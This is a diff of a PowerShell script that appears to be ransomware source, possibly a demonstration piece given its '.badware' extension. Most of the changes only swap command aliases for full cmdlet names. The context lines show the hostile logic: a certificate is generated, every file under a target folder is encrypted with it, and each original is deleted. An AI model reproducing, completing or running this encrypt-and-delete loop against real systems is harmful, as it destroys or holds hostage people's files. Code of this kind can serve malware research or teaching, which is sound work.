@@ -88,9 +88,9 @@ Export-Certificate -Cert $cert -FilePath "$TempDir\cert.cer" | Out-Null
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Base64 encoding the certificate 
 #----------------------------------------------------------------------------------------------------------------------------------------
-$encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$TempDir\cert.cer"))
+# $encodedcert = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$TempDir\cert.cer"))
 
-$CertPrint = get-childitem -Path "cert:\CurrentUser\my" | where { $_.subject -eq "CN=$CertName" } | select -expandproperty Thumbprint
+$CertPrint = get-childitem -Path "cert:\CurrentUser\my" | Where-Object { $_.subject -eq "CN=$CertName" } | Select-Object -expandproperty Thumbprint
 if ($CertPrint -is [array]) 
 {
  $CertPrint = $CertPrint[0]
@@ -222,7 +222,7 @@ Function Decrypt-File
 }
 #> 
 
-   foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | where { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
+   foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
    Encrypt-File $i $Cert 
    rm $i
    } 
